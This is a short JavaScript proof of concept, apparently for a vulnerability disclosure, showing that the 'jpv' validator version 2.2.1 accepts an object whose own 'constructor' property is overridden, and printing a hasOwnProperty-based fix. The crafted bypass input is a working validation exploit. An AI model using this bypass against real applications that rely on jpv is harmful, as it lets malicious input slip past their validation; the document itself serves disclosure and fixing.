import { validate } from 'jpv';
exampleJPV()

// Demo for the constructor bypass on version 2.2.1 
function exampleJPV() {
	console.log("On JPV version 2.2.1, we can override the constructor of our input to be an object constructor to bypass JPV validation")

	console.log("	our schema should be: aMap: new Map()");
	const schema = {
		aMap: new Map()
	};
	console.log(typeof (schema));
	
	console.log("This bad input below tricks jpv");

	console.log("	aMap: {\n	badcode: \"problematic input.\",\n	constructor: new Map().constructor \n	}");

	const input = {
		aMap: {
		  badcode: "problematic input.", 
		  constructor: new Map.constructor
		}
	};
	
	// jpv.validate(input, schema) should return false, but, as of 2.2.1, returns true
	console.log("jpv.validate(input, schema) = " + validate(input, schema));
	console.log(input.constructor === schema.constructor);

	// To fix this, we could check that the constructor is not inherited 

	console.log("This can be quickly fixed by checking if the object has its own constructor property, rather than being inherited");

	console.log("if (Object.prototype.hasOwnProperty.call(input.aMap, \"constructor\")) { return False } ");
	if (Object.prototype.hasOwnProperty.call(input.aMap, "constructor")) {
		console.log("Return False here");
	}

	console.log("An object that inherits the constructor is fine, as we demonstrate against the schema");
	console.log("if (!Object.prototype.hasOwnProperty.call(schema.aMap, \"constructor\")) { return False } ");
	if (!Object.prototype.hasOwnProperty.call(schema.aMap, "constructor")) {
		console.log("Return True here");
	}
}